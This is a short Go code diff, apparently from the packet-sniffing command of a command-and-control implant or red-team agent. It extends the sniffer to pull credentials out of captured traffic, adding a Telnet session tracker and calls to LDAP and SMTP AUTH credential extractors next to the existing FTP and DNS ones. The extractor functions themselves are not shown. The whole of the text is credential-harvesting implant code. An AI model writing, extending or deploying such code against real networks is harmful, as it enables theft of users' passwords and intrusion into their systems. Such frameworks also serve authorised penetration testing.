@@ -118,6 +118,7 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 	unix.Syscall(unix.SYS_IOCTL, uintptr(fd), uintptr(0x8010426D), uintptr(unsafe.Pointer(&tv)))
 
 	ftpTracker := &sniffFTPTracker{pending: make(map[string]string)}
+	telnetTracker := &sniffTelnetTracker{pending: make(map[string]string)}
 	var pcapCollector *sniffPCAPCollector
 	if params.SavePCAP {
 		pcapCollector = newSniffPCAPCollector(params.MaxBytes)
@@ -219,6 +220,15 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 										result.Credentials = append(result.Credentials, cred)
 									}
 									if cred := sniffExtractDNS(payload, &meta); cred != nil {
+										result.Credentials = append(result.Credentials, cred)
+									}
+									if cred := sniffExtractLDAP(payload, &meta); cred != nil {
+										result.Credentials = append(result.Credentials, cred)
+									}
+									if cred := sniffExtractSMTPAuth(payload, &meta); cred != nil {
+										result.Credentials = append(result.Credentials, cred)
+									}
+									if cred := telnetTracker.process(payload, &meta); cred != nil {
 										result.Credentials = append(result.Credentials, cred)
 									}
 								}
